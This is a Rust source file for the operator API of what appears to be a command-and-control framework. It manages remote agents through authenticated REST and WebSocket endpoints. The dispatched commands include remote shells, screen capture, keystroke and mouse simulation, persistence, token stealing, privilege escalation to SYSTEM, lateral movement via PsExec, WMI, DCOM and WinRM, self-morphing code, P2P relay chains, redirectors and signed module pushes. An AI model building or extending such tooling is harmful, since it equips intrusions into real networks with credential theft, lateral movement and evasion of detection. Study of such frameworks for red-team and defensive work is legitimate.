//! REST + WebSocket API for the operator dashboard.

use crate::auth::{require_bearer, AuthenticatedUser};
use crate::state::{now_secs, AgentView, AppState};
use axum::{
    extract::{
        ws::{Message as WsMessage, WebSocket, WebSocketUpgrade},
        Extension, Path, State,
    },
    http::StatusCode,
    middleware,
    response::IntoResponse,
    routing::{get, post},
    Json, Router,
};
use base64::{engine::general_purpose::STANDARD as B64, Engine as _};
use common::{Command, CryptoSession, Message, Outcome};
use ed25519_dalek::Signer;
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use std::sync::Arc;
use std::time::Duration;
use tokio::sync::oneshot;
use tower_http::services::ServeDir;

#[derive(Deserialize)]
pub struct CommandRequest {
    pub command: Command,
}

#[derive(Serialize)]
pub struct CommandReply {
    pub task_id: String,
    pub outcome: &'static str,
    pub output: Option<String>,
    pub error: Option<String>,
}

#[derive(Serialize)]
pub struct OpenShellReply {
    pub session_id: String,
}

#[derive(Deserialize)]
pub struct ShellInputRequest {
    /// Base64-encoded bytes to write to the shell's stdin.
    pub data: String,
}

#[derive(Serialize)]
pub struct ShellOutputReply {
    /// Base64-encoded bytes read from the shell's stdout/stderr since last poll.
    pub data: String,
}

#[derive(Deserialize)]
pub struct PushModuleRequest {
    /// Logical module name (used by the agent for plugin registry key).
    pub module_name: String,
    /// Version string forwarded to the agent.
    #[serde(default)]
    pub version: String,
    /// Base64-encoded module binary (shared library / DLL).
    pub module_data: String,
}

#[derive(Deserialize)]
pub struct LinkAgentsRequest {
    pub parent_agent_id: String,
    pub child_agent_id: String,
    /// Transport to use: `"smb"` or `"tcp"`.
    pub transport: String,
    /// Target address for TCP links (host:port).  Ignored for SMB.
    #[serde(default)]
    pub target_addr: String,
}

#[derive(Deserialize)]
pub struct UnlinkAgentRequest {
    pub agent_id: String,
}

#[derive(Serialize)]
pub struct TopologyReply {
    pub nodes: Vec<TopologyNodeView>,
}

#[derive(Serialize)]
pub struct TopologyNodeView {
    pub agent_id: String,
    pub parent: Option<String>,
    pub children: Vec<String>,
    pub depth: u32,
}

pub fn router(state: Arc<AppState>, static_dir: std::path::PathBuf) -> Router {
    // Routes that require the standard `Authorization: Bearer <token>` header.
    let api_authed = Router::new()
        .route("/agents", get(list_agents))
        // Route by reported agent_id (most-recently-seen wins when duplicates exist).
        .route("/agents/:id/command", post(send_command_by_agent_id))
        // Unambiguous routing by server-assigned connection_id.
        .route(
            "/connections/:id/command",
            post(send_command_by_connection_id),
        )
        .route("/audit", get(recent_audit))
        .route("/build", post(crate::build_handler::handle_build))
        .route(
            "/build/status/:id",
            get(crate::build_handler::handle_build_status),
        )
        .route(
            "/build/:id/download",
            get(crate::build_handler::handle_download),
        )
        .route("/agents/:id/shell", post(open_shell))
        .route("/agents/:id/shell/:sid/input", post(shell_input))
        .route("/agents/:id/shell/:sid/output", get(shell_output))
        .route("/agents/:id/push-module", post(push_module))
        // P2P mesh management endpoints.
        .route("/p2p/link", post(link_agents))
        .route("/p2p/unlink", post(unlink_agent))
        .route("/p2p/topology", get(list_topology))
        // Redirector management endpoints (authed for operator use).
        .route("/redirector/list", get(crate::redirector::handle_list))
        .route("/redirector/remove", post(crate::redirector::handle_remove))
        .route("/redirector/register", post(crate::redirector::handle_register))
        .route(
            "/redirector/agent-config/:profile",
            get(crate::redirector::handle_agent_config),
        )
        .route_layer(middleware::from_fn_with_state(
            state.clone(),
            require_bearer,
        ))
        .with_state(state.clone());

    // Redirector heartbeat endpoint — outside auth because redirectors
    // use their redirector ID as authentication (not a bearer token).
    let redirector_public = Router::new()
        .route(
            "/redirector/heartbeat",
            post(crate::redirector::handle_heartbeat),
        )
        .with_state(state.clone());

    // The WebSocket endpoint authenticates inside the handler because
    // browsers cannot set custom headers on WebSocket upgrade requests;
    // the token is carried in the `Sec-WebSocket-Protocol` header.
    let api = api_authed
        .route("/ws", get(ws_handler).with_state(state.clone()))
        .merge(redirector_public);

    Router::new()
        .nest("/api", api)
        .fallback_service(ServeDir::new(static_dir).append_index_html_on_directories(true))
}

async fn list_agents(State(state): State<Arc<AppState>>) -> Json<Vec<AgentView>> {
    Json(state.list_agents())
}

async fn recent_audit(State(state): State<Arc<AppState>>) -> Json<Vec<common::AuditEvent>> {
    Json(state.audit.recent(200))
}

async fn open_shell(
    State(state): State<Arc<AppState>>,
    Extension(user): Extension<AuthenticatedUser>,
    Path(agent_id): Path<String>,
) -> Result<Json<OpenShellReply>, (StatusCode, String)> {
    let entry = state
        .find_by_agent_id(&agent_id)
        .ok_or((StatusCode::NOT_FOUND, "no agent with that agent_id".into()))?;
    let req = CommandRequest {
        command: Command::StartShell,
    };
    let reply = dispatch_command(state, user, entry, req).await?;
    let session_id = reply.0.output.unwrap_or_default();
    Ok(Json(OpenShellReply { session_id }))
}

async fn shell_input(
    State(state): State<Arc<AppState>>,
    Extension(user): Extension<AuthenticatedUser>,
    Path((agent_id, session_id)): Path<(String, String)>,
    Json(req): Json<ShellInputRequest>,
) -> Result<StatusCode, (StatusCode, String)> {
    let entry = state
        .find_by_agent_id(&agent_id)
        .ok_or((StatusCode::NOT_FOUND, "no agent with that agent_id".into()))?;
    let data = B64
        .decode(&req.data)
        .map_err(|_| (StatusCode::BAD_REQUEST, "invalid base64 in data field".into()))?;
    let cmd_req = CommandRequest {
        command: Command::ShellInput { session_id, data },
    };
    let _ = dispatch_command(state, user, entry, cmd_req).await?;
    Ok(StatusCode::NO_CONTENT)
}

async fn shell_output(
    State(state): State<Arc<AppState>>,
    Extension(user): Extension<AuthenticatedUser>,
    Path((agent_id, session_id)): Path<(String, String)>,
) -> Result<Json<ShellOutputReply>, (StatusCode, String)> {
    let entry = state
        .find_by_agent_id(&agent_id)
        .ok_or((StatusCode::NOT_FOUND, "no agent with that agent_id".into()))?;
    let cmd_req = CommandRequest {
        command: Command::ShellOutput { session_id },
    };
    let reply = dispatch_command(state, user, entry, cmd_req).await?;
    let data = reply.0.output.unwrap_or_default();
    Ok(Json(ShellOutputReply { data }))
}

/// Sign a module binary with Ed25519.
///
/// The signature covers `SHA-256(module_bytes) || module_bytes` so that
/// the verifier can check both integrity and authenticity in one shot.
/// Returns `[64-byte Ed25519 signature][module_bytes]`.
pub fn sign_module(
    signing_key: &ed25519_dalek::SigningKey,
    module_bytes: &[u8],
) -> Vec<u8> {
    // Compute SHA-256(module_bytes) || module_bytes.
    let hash = Sha256::digest(module_bytes);
    let mut msg = Vec::with_capacity(32 + module_bytes.len());
    msg.extend_from_slice(&hash);
    msg.extend_from_slice(module_bytes);

    let signature = signing_key.sign(&msg);
    let mut out = Vec::with_capacity(64 + module_bytes.len());
    out.extend_from_slice(signature.to_bytes().as_ref());
    out.extend_from_slice(module_bytes);
    out
}

/// Load the Ed25519 signing key from server config (base64-encoded 32-byte seed).
pub fn load_signing_key(state: &AppState) -> Result<ed25519_dalek::SigningKey, (StatusCode, String)> {
    let b64 = state
        .config
        .module_signing_key
        .as_ref()
        .ok_or((
            StatusCode::INTERNAL_SERVER_ERROR,
            "module_signing_key not configured on server".into(),
        ))?;
    let bytes = B64
        .decode(b64)
        .map_err(|_| (StatusCode::INTERNAL_SERVER_ERROR, "module_signing_key is not valid base64".into()))?;
    let seed: [u8; 32] = bytes
        .try_into()
        .map_err(|_| (StatusCode::INTERNAL_SERVER_ERROR, "module_signing_key must be exactly 32 bytes".into()))?;
    Ok(ed25519_dalek::SigningKey::from_bytes(&seed))
}

/// Load the module AES key from server config and build a `CryptoSession`.
pub fn load_module_crypto(state: &AppState) -> Result<CryptoSession, (StatusCode, String)> {
    let b64 = state
        .config
        .module_aes_key
        .as_ref()
        .ok_or((
            StatusCode::INTERNAL_SERVER_ERROR,
            "module_aes_key not configured on server".into(),
        ))?;
    let bytes = B64
        .decode(b64)
        .map_err(|_| (StatusCode::INTERNAL_SERVER_ERROR, "module_aes_key is not valid base64".into()))?;
    let key: [u8; 32] = bytes
        .try_into()
        .map_err(|_| (StatusCode::INTERNAL_SERVER_ERROR, "module_aes_key must be exactly 32 bytes".into()))?;
    Ok(CryptoSession::from_key(key))
}

/// `POST /api/agents/:id/push-module`
///
/// Sign a module binary with the server's Ed25519 key, AES-encrypt the
/// signed payload, and push it to the agent as a `ModulePush` message.
async fn push_module(
    State(state): State<Arc<AppState>>,
    Extension(user): Extension<AuthenticatedUser>,
    Path(agent_id): Path<String>,
    Json(req): Json<PushModuleRequest>,
) -> Result<Json<CommandReply>, (StatusCode, String)> {
    let entry = state
        .find_by_agent_id(&agent_id)
        .ok_or((StatusCode::NOT_FOUND, "no agent with that agent_id".into()))?;

    // Decode the base64 module binary.
    let module_bytes = B64
        .decode(&req.module_data)
        .map_err(|_| (StatusCode::BAD_REQUEST, "module_data is not valid base64".into()))?;

    // Sign the module.
    let signing_key = load_signing_key(&state)?;
    let signed = sign_module(&signing_key, &module_bytes);

    // Encrypt with the shared AES key.
    let crypto = load_module_crypto(&state)?;
    let encrypted_blob = crypto.encrypt(&signed);

    // Send ModulePush to the agent.
    let msg = Message::ModulePush {
        module_name: req.module_name.clone(),
        version: req.version.clone(),
        encrypted_blob,
    };
    if entry.tx.send(msg).await.is_err() {
        return Err((StatusCode::BAD_GATEWAY, "agent disconnected".into()));
    }

    state.audit.record_simple(
        &agent_id,
        &user.0,
        "PushModule",
        &format!(
            "PushModule(module={:?}, version={:?}, size={})",
            req.module_name,
            req.version,
            module_bytes.len()
        ),
        Outcome::Success,
    );

    Ok(Json(CommandReply {
        task_id: String::new(),
        outcome: "pushed",
        output: Some(format!(
            "module '{}' ({} bytes) signed and pushed",
            req.module_name,
            module_bytes.len()
        )),
        error: None,
    }))
}

// ── P2P mesh management ─────────────────────────────────────────────────

/// `POST /api/p2p/link`
///
/// Instruct a child agent to establish a P2P link to a parent agent.
/// Sends a `LinkAgents` command to the child, which initiates the P2P
/// connection.
async fn link_agents(
    State(state): State<Arc<AppState>>,
    Extension(user): Extension<AuthenticatedUser>,
    Json(req): Json<LinkAgentsRequest>,
) -> Result<Json<CommandReply>, (StatusCode, String)> {
    // Validate that the parent agent exists (directly connected or via P2P).
    let parent_entry = state.find_by_agent_id(&req.parent_agent_id);
    if parent_entry.is_none() {
        // Check if the parent is reachable via P2P relay.
        if state.route_to_agent(&req.parent_agent_id).await.is_none() {
            return Err((
                StatusCode::NOT_FOUND,
                format!(
                    "parent agent '{}' not found (direct or via P2P relay)",
                    req.parent_agent_id
                ),
            ));
        }
    }

    // Send the LinkAgents command to the child agent.
    let cmd_req = CommandRequest {
        command: Command::LinkAgents {
            parent_agent_id: req.parent_agent_id.clone(),
            child_agent_id: req.child_agent_id.clone(),
            transport: req.transport.clone(),
            target_addr: req.target_addr.clone(),
        },
    };

    let entry = state
        .find_by_agent_id(&req.child_agent_id)
        .ok_or((
            StatusCode::NOT_FOUND,
            format!(
                "child agent '{}' must be directly connected to issue LinkAgents",
                req.child_agent_id
            ),
        ))?;

    state.audit.record_simple(
        &req.child_agent_id,
        &user.0,
        "LinkAgents",
        &format!(
            "parent={}, child={}, transport={}, addr={}",
            req.parent_agent_id, req.child_agent_id, req.transport, req.target_addr
        ),
        Outcome::Success,
    );

    dispatch_command(state, user, entry, cmd_req).await
}

/// `POST /api/p2p/unlink`
///
/// Instruct an agent to disconnect from its P2P parent.
async fn unlink_agent(
    State(state): State<Arc<AppState>>,
    Extension(user): Extension<AuthenticatedUser>,
    Json(req): Json<UnlinkAgentRequest>,
) -> Result<Json<CommandReply>, (StatusCode, String)> {
    let cmd_req = CommandRequest {
        command: Command::UnlinkAgent {
            agent_id: req.agent_id.clone(),
        },
    };

    let entry = state
        .find_by_agent_id(&req.agent_id)
        .ok_or((
            StatusCode::NOT_FOUND,
            format!(
                "agent '{}' not found or not directly connected",
                req.agent_id
            ),
        ))?;

    state.audit.record_simple(
        &req.agent_id,
        &user.0,
        "UnlinkAgent",
        &format!("unlink agent_id={}", req.agent_id),
        Outcome::Success,
    );

    dispatch_command(state, user, entry, cmd_req).await
}

/// `GET /api/p2p/topology`
///
/// Return the current P2P mesh topology as seen by the server.
async fn list_topology(State(state): State<Arc<AppState>>) -> Json<TopologyReply> {
    let topo = state.topology.read().await;
    let nodes = topo
        .nodes
        .iter()
        .map(|(agent_id, node)| TopologyNodeView {
            agent_id: agent_id.clone(),
            parent: node.parent.clone(),
            children: node.children.clone(),
            depth: node.depth,
        })
        .collect();
    Json(TopologyReply { nodes })
}

// ── Command dispatch ──────────────────────────────────────────────────────

async fn send_command_by_agent_id(
    State(state): State<Arc<AppState>>,
    Extension(user): Extension<AuthenticatedUser>,
    Path(agent_id): Path<String>,
    Json(req): Json<CommandRequest>,
) -> Result<Json<CommandReply>, (StatusCode, String)> {
    // First, try to find a directly-connected agent.
    if let Some(entry) = state.find_by_agent_id(&agent_id) {
        return dispatch_command(state, user, entry, req).await;
    }

    // Not directly connected — check if the agent is reachable through
    // the P2P relay chain.
    let route = state
        .route_to_agent(&agent_id)
        .await
        .ok_or((
            StatusCode::NOT_FOUND,
            format!("no agent with agent_id '{agent_id}' (direct or via P2P relay)"),
        ))?;

    // The route is: [(directly_connected_agent, link_id), ..., (last_parent, link_id)]
    // Build the routing blob from inside out:
    //   1. Serialize the command as a TaskRequest message.
    //   2. Wrap it in layers of P2pToChild from innermost to outermost.
    let task_id = uuid::Uuid::new_v4().to_string();
    let cmd_label_str = command_label(&req.command);
    let inner_msg = Message::TaskRequest {
        task_id: task_id.clone(),
        command: req.command,
        operator_id: Some(user.0.clone()),
    };

    // Serialize the innermost C2 message.
    let mut payload = bincode::serialize(&inner_msg)
        .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, format!("serialize: {e}")))?;

    // Wrap in P2P routing blobs from the innermost hop to the outermost.
    // route = [(hop1_agent, hop1_link), (hop2_agent, hop2_link), ...]
    // For a 2-hop route [(A, la_b), (B, lb_c)]:
    //   payload = build_blob(lb_c, serialize(c2_msg))
    //   Then server sends P2pToChild { la_b, payload }
    //
    // For a 3-hop route [(A, la_b), (B, lb_c), (C, lc_d)]:
    //   payload = build_blob(lc_d, serialize(c2_msg))   // C→D
    //   payload = build_blob(lb_c, payload)              // B→C
    //   Then server sends P2pToChild { la_b, payload }
    //
    // The last element is the direct child of the target, so we start there
    // and work backwards, skipping route[0] (the first hop's link_id goes
    // in the P2pToChild envelope, not in the blob).
    for (_, link_id) in route.iter().skip(1).rev() {
        // Build routing blob: [link_id:u32 LE][payload_len:u32 LE][payload]
        let mut blob = Vec::with_capacity(4 + 4 + payload.len());
        blob.extend_from_slice(&link_id.to_le_bytes());
        blob.extend_from_slice(&(payload.len() as u32).to_le_bytes());
        blob.extend_from_slice(&payload);
        payload = blob;
    }

    // Send the outermost P2pToChild to the directly-connected agent.
    let first_hop_agent_id = route[0].0.clone();
    let first_hop_entry = state
        .find_by_agent_id(&first_hop_agent_id)
        .ok_or((
            StatusCode::NOT_FOUND,
            format!(
                "first-hop agent '{first_hop_agent_id}' is no longer connected"
            ),
        ))?;

    let first_link_id = route[0].1;
    let p2p_msg = Message::P2pToChild {
        child_link_id: first_link_id,
        data: payload,
    };

    if first_hop_entry.tx.send(p2p_msg).await.is_err() {
        state.audit.record_simple(
            &agent_id,
            &user.0,
            cmd_label_str,
            "P2P relay send failed — first hop disconnected",
            Outcome::Failure,
        );
        return Err((
            StatusCode::BAD_GATEWAY,
            "first-hop agent disconnected".into(),
        ));
    }

    state.audit.record_simple(
        &agent_id,
        &user.0,
        cmd_label_str,
        &format!(
            "command relayed via P2P chain ({} hops, first={})",
            route.len(),
            first_hop_agent_id
        ),
        Outcome::Success,
    );

    // For relayed commands we can't wait for a response (the child's
    // response would need to traverse the relay chain back).  Return
    // immediately with a "relayed" status.
    Ok(Json(CommandReply {
        task_id,
        outcome: "relayed",
        output: Some(format!(
            "command relayed to '{}' via {} hop(s)",
            agent_id,
            route.len()
        )),
        error: None,
    }))
}

async fn send_command_by_connection_id(
    State(state): State<Arc<AppState>>,
    Extension(user): Extension<AuthenticatedUser>,
    Path(connection_id): Path<String>,
    Json(req): Json<CommandRequest>,
) -> Result<Json<CommandReply>, (StatusCode, String)> {
    let entry = state.find_by_connection_id(&connection_id).ok_or((
        StatusCode::NOT_FOUND,
        "no agent with that connection_id".into(),
    ))?;
    dispatch_command(state, user, entry, req).await
}

async fn dispatch_command(
    state: Arc<AppState>,
    user: AuthenticatedUser,
    entry: crate::state::AgentEntry,
    req: CommandRequest,
) -> Result<Json<CommandReply>, (StatusCode, String)> {
    // Use the reported agent_id for audit and response labelling.
    let agent_id = entry.agent_id.clone();

    let task_id = uuid::Uuid::new_v4().to_string();
    let (tx, rx) = oneshot::channel();
    state.pending.insert(task_id.clone(), tx);

    let cmd_label = command_label(&req.command);
    let cmd_detail = serde_json::to_string(&req.command).unwrap_or_default();
    let is_morph_now = matches!(req.command, Command::MorphNow { .. });
    let connection_id = entry.connection_id.clone();

    let request = Message::TaskRequest {
        task_id: task_id.clone(),
        command: req.command,
        operator_id: Some(user.0.clone()),
    };

    if entry.tx.send(request).await.is_err() {
        state.pending.remove(&task_id);
        state
            .audit
            .record_simple(&agent_id, &user.0, cmd_label, &cmd_detail, Outcome::Failure);
        return Err((StatusCode::BAD_GATEWAY, "agent disconnected".into()));
    }

    let timeout = Duration::from_secs(state.command_timeout_secs);
    let result = tokio::time::timeout(timeout, rx).await;

    match result {
        Ok(Ok(Ok(output))) => {
            // If this was a MorphNow command, capture the .text hash from
            // the response and store it in the agent's entry.
            if is_morph_now {
                state.update_text_hash(&connection_id, &output);
                tracing::info!(
                    agent_id = %agent_id,
                    connection_id = %connection_id,
                    text_hash = %output,
                    "MorphNow completed — .text hash recorded"
                );
            }
            state
                .audit
                .record_simple(&agent_id, &user.0, cmd_label, &cmd_detail, Outcome::Success);
            Ok(Json(CommandReply {
                task_id,
                outcome: "ok",
                output: Some(output),
                error: None,
            }))
        }
        Ok(Ok(Err(err))) => {
            state
                .audit
                .record_simple(&agent_id, &user.0, cmd_label, &cmd_detail, Outcome::Failure);
            Ok(Json(CommandReply {
                task_id,
                outcome: "error",
                output: None,
                error: Some(err),
            }))
        }
        Ok(Err(_canceled)) => {
            state.pending.remove(&task_id);
            Err((
                StatusCode::INTERNAL_SERVER_ERROR,
                "response channel closed".into(),
            ))
        }
        Err(_elapsed) => {
            state.pending.remove(&task_id);
            state.audit.record_simple(
                &agent_id,
                &user.0,
                cmd_label,
                &format!("{cmd_detail} [timeout]"),
                Outcome::Failure,
            );
            Err((
                StatusCode::GATEWAY_TIMEOUT,
                "agent did not respond in time".into(),
            ))
        }
    }
}

fn command_label(c: &Command) -> &'static str {
    match c {
        Command::Ping => "Ping",
        Command::GetSystemInfo => "GetSystemInfo",
        Command::RunApprovedScript { .. } => "RunApprovedScript",
        Command::ListDirectory { .. } => "ListDirectory",
        Command::ReadFile { .. } => "ReadFile",
        Command::WriteFile { .. } => "WriteFile",
        Command::DeployModule { .. } => "DeployModule",
        Command::ExecutePlugin { .. } => "ExecutePlugin",
        Command::StartShell => "StartShell",
        Command::ShellInput { .. } => "ShellInput",
        Command::ShellOutput { .. } => "ShellOutput",
        Command::CloseShell { .. } => "CloseShell",
        Command::Shutdown => "Shutdown",
        Command::DiscoverNetwork => "DiscoverNetwork",
        Command::CaptureScreen => "CaptureScreen",
        Command::SimulateKey { .. } => "SimulateKey",
        Command::SimulateMouse { .. } => "SimulateMouse",
        Command::StartHciLogging => "StartHciLogging",
        Command::StopHciLogging => "StopHciLogging",
        Command::GetHciLogBuffer => "GetHciLogBuffer",
        Command::ReloadConfig => "ReloadConfig",
        Command::EnablePersistence => "EnablePersistence",
        Command::DisablePersistence => "DisablePersistence",
        Command::MigrateAgent { .. } => "MigrateAgent",
        Command::ListProcesses => "ListProcesses",
        Command::SetReencodeSeed { .. } => "SetReencodeSeed",
        Command::MorphNow { .. } => "MorphNow",
        Command::ListPlugins => "ListPlugins",
        Command::UnloadPlugin { .. } => "UnloadPlugin",
        Command::GetPluginInfo { .. } => "GetPluginInfo",
        Command::DownloadModule { .. } => "DownloadModule",
        Command::ExecutePluginBinary { .. } => "ExecutePluginBinary",
        Command::JobStatus { .. } => "JobStatus",
        Command::MakeToken { .. } => "MakeToken",
        Command::StealToken { .. } => "StealToken",
        Command::Rev2Self => "Rev2Self",
        Command::GetSystem => "GetSystem",
        Command::PsExec { .. } => "PsExec",
        Command::WmiExec { .. } => "WmiExec",
        Command::DcomExec { .. } => "DcomExec",
        Command::WinRmExec { .. } => "WinRmExec",
        Command::LinkAgents { .. } => "LinkAgents",
        Command::UnlinkAgent { .. } => "UnlinkAgent",
        Command::ListTopology => "ListTopology",
        Command::LinkTo { .. } => "LinkTo",
        Command::Unlink { .. } => "Unlink",
        Command::ListLinks => "ListLinks",
    }
}

async fn ws_handler(
    ws: WebSocketUpgrade,
    State(state): State<Arc<AppState>>,
    headers: axum::http::HeaderMap,
) -> axum::response::Response {
    // Browsers can't attach `Authorization` to a WebSocket handshake,
    // so the dashboard sends the bearer token as a subprotocol value
    // of the form `bearer.<token>`. Validate it here in constant time
    // before accepting the upgrade.
    let presented = headers
        .get(axum::http::header::SEC_WEBSOCKET_PROTOCOL)
        .and_then(|v| v.to_str().ok())
        .and_then(extract_bearer_subprotocol);

    let token = match presented {
        Some(t) => t,
        None => return (StatusCode::UNAUTHORIZED, "missing bearer subprotocol").into_response(),
    };

    use subtle::ConstantTimeEq;

    // 1. Try the multi-operator store.
    if let Some(operator_id) = state.authenticate_operator(&token) {
        let subprotocol = format!("bearer.{}", token);
        return ws
            .protocols([subprotocol])
            .on_upgrade(move |sock| ws_loop(sock, state, operator_id));
    }

    // 2. Fallback: legacy single admin token.
    let ok: bool = token.as_bytes().ct_eq(state.admin_token.as_bytes()).into();
    if !ok {
        return (StatusCode::UNAUTHORIZED, "invalid token").into_response();
    }

    // Echo the chosen subprotocol back so the browser accepts the
    // upgrade (otherwise the handshake fails).
    let subprotocol = format!("bearer.{}", token);
    ws.protocols([subprotocol])
        .on_upgrade(move |sock| ws_loop(sock, state, "admin".into()))
}

fn extract_bearer_subprotocol(header: &str) -> Option<String> {
    header
        .split(',')
        .map(str::trim)
        .find_map(|p| p.strip_prefix("bearer.").map(|t| t.to_string()))
}

#[derive(Serialize)]
#[serde(tag = "kind", rename_all = "snake_case")]
enum DashboardEvent {
    Agents { agents: Vec<AgentView>, ts: u64 },
    Audit { event: common::AuditEvent },
}

async fn ws_loop(mut socket: WebSocket, state: Arc<AppState>, operator_id: String) {
    let mut audit_rx = state.audit.subscribe();
    let mut tick = tokio::time::interval(Duration::from_secs(2));
    // Log the WebSocket connection with operator attribution.
    state.audit.record_simple(
        "",
        &operator_id,
        "WebSocketConnect",
        "dashboard websocket session opened",
        common::Outcome::Success,
    );
    // Send an initial snapshot.
    if send_snapshot(&mut socket, &state).await.is_err() {
        return;
    }
    loop {
        tokio::select! {
            _ = tick.tick() => {
                if send_snapshot(&mut socket, &state).await.is_err() { break; }
            }
            ev = audit_rx.recv() => {
                match ev {
                    Ok(event) => {
                        let payload = DashboardEvent::Audit { event };
                        if let Ok(text) = serde_json::to_string(&payload) {
                            if socket.send(WsMessage::Text(text)).await.is_err() { break; }
                        }
                    }
                    Err(tokio::sync::broadcast::error::RecvError::Lagged(_)) => continue,
                    Err(_) => break,
                }
            }
            incoming = socket.recv() => {
                match incoming {
                    Some(Ok(WsMessage::Close(_))) | None => break,
                    Some(Ok(_)) => continue,
                    Some(Err(_)) => break,
                }
            }
        }
    }
}

async fn send_snapshot(socket: &mut WebSocket, state: &AppState) -> Result<(), axum::Error> {
    let payload = DashboardEvent::Agents {
        agents: state.list_agents(),
        ts: now_secs(),
    };
    let text = serde_json::to_string(&payload).unwrap_or_else(|_| "{}".into());
    socket.send(WsMessage::Text(text)).await
}
